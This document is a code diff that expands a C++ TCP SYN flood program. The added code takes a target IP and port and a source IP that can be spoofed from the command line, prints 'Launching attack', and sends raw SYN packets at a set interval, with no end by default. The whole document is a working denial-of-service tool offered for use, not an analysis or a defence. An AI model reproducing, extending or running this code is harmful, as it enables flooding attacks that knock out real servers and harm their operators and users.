@@ -1,32 +1,65 @@
-#include "tcp_synflood.h"
+#include "tcp_synflood.hpp"
 
 using namespace std;
 
-struct pseudo_header
-{
-	unsigned int source_address;
-	unsigned int dest_address;
-	unsigned char placeholder;
-	unsigned char protocol;
-	unsigned short tcp_length;
-};
+char SRC_IP[IP_SIZE];
+char DST_IP[IP_SIZE];
+unsigned short SRC_PORT = get_rand();
+unsigned short DST_PORT = 80;
 
-struct tcpopt
+int main(int argc, char **argv)
 {
-    unsigned char mms_knd;
-    unsigned char mms_len;
-    unsigned short mms_val;
-    unsigned char nop_1;
-    unsigned char ws_knd;
-    unsigned char ws_len;
-    unsigned char ws_val;
-    unsigned char nop_2;
-    unsigned char nop_3;
-    unsigned char sck_knd;
-    unsigned char sck_len;
-};
+    int opt;
+    unsigned int sleep_time = 10;
+    int packet_to_send = -1;
 
-int main(int argc, char *argv[])
+    memset(SRC_IP, 0, IP_SIZE);
+    memset(DST_IP, 0, IP_SIZE);
+
+    while ((opt = getopt(argc, argv, "s:d:p:t:n:")) != EOF)
+    {
+        switch(opt)
+        {
+            case 's': {
+                strcpy(SRC_IP, optarg);
+                break;
+            }
+            case 'd': {
+                strcpy(DST_IP, optarg);
+                break;
+            }
+            case 'p': {
+                DST_PORT = atoi(optarg);
+                break;
+            }
+            case 'n': {
+                packet_to_send = atoi(optarg);
+                break;
+            }
+            case 't': {
+                sleep_time = atoi(optarg);
+                break;
+            }
+            case '?': {
+                printf("Usage : ./tcp_synflood -s \"source ip\" -d \"destination ip\" -p <port> -t <time to sleep in ms>\n");
+            }
+        }
+    }
+
+    cout << inet_addr(SRC_IP) << endl;
+
+    if(strlen(SRC_IP) > 0 && strlen(DST_IP) > 0)
+    {
+        printf("Launching attack to %s:%d from %s:%d every %d ms", DST_IP, DST_PORT, SRC_IP, SRC_PORT, sleep_time);
+        exploit(sleep_time, packet_to_send);
+    }
+    else
+        printf("Usage : ./tcp_synflood -s \"source ip\" -d \"destination ip\" -p <port> -t <time to sleep in ms>\n");
+
+    return EXIT_SUCCESS;
+}
+
+void exploit(unsigned int time_to_sleep, int packet_to_send)
 {
     SOCKET socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
 
@@ -52,7 +85,7 @@ int main(int argc, char *argv[])
         }
         else
         {
-            for(int i = 0; i < 10; i++)
+            for(int i = packet_to_send; i > 0 || i == -1; i--)
             {
                 memset(packet, 0, PACKET_SIZE);
                 fill_ip_header(ip_header);
@@ -69,15 +102,12 @@ int main(int argc, char *argv[])
                     exit(-3);
 		        }
 		        else
-		        {
-			        printf("Packet sent successfully !\n");
-                    this_thread::sleep_for(chrono::milliseconds(1000));
-		        }
+                    this_thread::sleep_for(chrono::milliseconds(time_to_sleep));
             }
         }
     }
 
-    return EXIT_SUCCESS;
+    close(socket_fd);
 }
 
 void fill_ip_header(IPHDR *ip_header)
@@ -116,7 +146,7 @@ void fill_tcp_opt(TCPOPT* tcp_opt)
 
 void fill_tcp_header(TCPHDR *tcp_header, TCPOPT* tcp_opt)
 {
-    tcp_header->source = htons(get_rand());
+    tcp_header->source = htons(SRC_PORT);
     tcp_header->dest = htons(DST_PORT);
     tcp_header->seq = 0;
     tcp_header->ack_seq = 0;
